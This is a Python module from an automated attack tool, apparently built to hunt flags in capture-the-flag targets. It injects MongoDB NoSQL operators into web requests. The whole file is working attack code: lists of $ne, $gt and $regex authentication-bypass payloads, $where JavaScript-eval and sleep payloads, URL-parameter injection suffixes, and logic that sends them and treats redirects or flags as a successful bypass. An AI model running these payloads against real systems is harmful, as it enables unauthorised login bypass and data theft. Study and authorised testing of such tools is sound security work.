"""
NoSQL Injection attack module.
Targets MongoDB operator injection in JSON bodies and URL params.
"""
from __future__ import annotations
import json
from urllib.parse import urlparse, urlunparse

from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag, extract_interesting_data
from rich.console import Console

console = Console(legacy_windows=False)

AUTH_BYPASS_PAYLOADS_FORM = [
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
]

NOSQL_PARAM_HINTS = [
    "id", "user", "email", "name", "search", "q", "query",
    "filter", "where", "find", "match", "key", "login", "auth",
]

URL_PARAM_PAYLOADS = [
    "[$ne]=1",
    "[%24ne]=1",
    "[$gt]=",
    "[$regex]=.*",
    "[$exists]=true",
]

WHERE_PAYLOADS = [
    {"$where": "this.password == this.password"},
    {"$where": "sleep(3000)"},
]


class NoSQLAttack(BaseAttack):
    name = "nosql"
    _seen_post_urls: set[str] = set()  # class-level — POST dedup across instances

    async def _check_response(self, response, url: str, label: str) -> tuple[list[dict], bool]:
        findings = extract_interesting_data(response.text)
        flag = has_definite_flag(findings)
        # Only flag on actual redirect (302 = login success) or confirmed flag.
        # Text hints like "logout"/"admin" fire on every authenticated page → false positives.
        # Return [] when not bypass so ip_address/html_comment don't leak into Phase 3.
        is_bypass = response.status_code == 302 or flag
        if is_bypass:
            console.print(f"  [bold red][NoSQL][/bold red] {label}")
            findings.append({
                "type": "nosql_injection",
                "value": f"NoSQL @ {url}: {response.text[:300]}",
                "confidence": 0.9,
            })
            return findings, bool(flag)
        return [], bool(flag)

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param", "")
        method = attack_point.get("method", "GET")
        raw_post_data = attack_point.get("post_data")

        # Skip GET params that don't look like NoSQL-relevant fields.
        # Also skip GET with no param — nothing to inject into the URL.
        if method.upper() == "GET" and (not param or not any(
            hint in param.lower() for hint in NOSQL_PARAM_HINTS
        )):
            return []

        if method.upper() == "POST":
            if url in NoSQLAttack._seen_post_urls:
                return []
            NoSQLAttack._seen_post_urls.add(url)

        console.print(f"  [cyan][NoSQL][/cyan] {method} {url}")
        all_findings = []

        if method.upper() == "POST":
            # Generic auth bypass payloads
            for payload_dict in AUTH_BYPASS_PAYLOADS_FORM:
                if self._should_stop():
                    break
                try:
                    response = await self.session.post(url, json=payload_dict, timeout=10.0)
                except Exception:
                    continue
                if response.status_code in (200, 302) and len(response.text) > 10:
                    findings, flag = await self._check_response(response, url, f"Auth bypass: {payload_dict}")
                    all_findings.extend(findings)
                    if flag:
                        self.stop_event.set()
                        return all_findings

            # Ghost API: inject $ne into actual captured POST body fields
            if raw_post_data:
                try:
                    body = json.loads(raw_post_data)
                    if isinstance(body, dict):
                        injected = {k: {"$ne": ""} if isinstance(v, str) else v
                                    for k, v in body.items()}
                        response = await self.session.post(url, json=injected, timeout=10.0)
                        if response.status_code in (200, 302) and len(response.text) > 10:
                            findings, flag = await self._check_response(
                                response, url, f"Ghost API body injection: {injected}"
                            )
                            all_findings.extend(findings)
                            if flag:
                                self.stop_event.set()
                                return all_findings
                except (json.JSONDecodeError, Exception):
                    pass

            # $where operator payloads (MongoDB JS eval)
            for where_payload in WHERE_PAYLOADS:
                if self._should_stop():
                    break
                try:
                    response = await self.session.post(url, json=where_payload, timeout=10.0)
                    if response.status_code in (200, 302) and len(response.text) > 10:
                        findings, flag = await self._check_response(response, url, f"$where: {where_payload}")
                        all_findings.extend(findings)
                        if flag:
                            self.stop_event.set()
                            return all_findings
                except Exception:
                    pass

            # Extra payloads from skills
            for raw_payload in payloads:
                if self._should_stop():
                    break
                try:
                    payload_dict = json.loads(raw_payload)
                    response = await self.session.post(url, json=payload_dict, timeout=10.0)
                    if response.status_code in (200, 302) and len(response.text) > 10:
                        findings, flag = await self._check_response(response, url, f"Skill payload: {raw_payload}")
                        all_findings.extend(findings)
                        if flag:
                            self.stop_event.set()
                            return all_findings
                except (json.JSONDecodeError, Exception):
                    pass

        if param:
            for suffix in URL_PARAM_PAYLOADS:
                if self._should_stop():
                    break
                try:
                    parsed = urlparse(url)
                    new_query = f"{param}{suffix}"
                    test_url = urlunparse(parsed._replace(query=new_query))
                    response = await self.session.get(test_url, timeout=10.0)
                except Exception:
                    continue
                if response.status_code == 200 and len(response.text) > 10:
                    findings = extract_interesting_data(response.text)
                    flag = has_definite_flag(findings)
                    if flag:
                        console.print(f"  [yellow][NoSQL][/yellow] Param injection: {suffix}")
                        all_findings.extend(findings)
                        self.stop_event.set()
                        return all_findings

        return all_findings
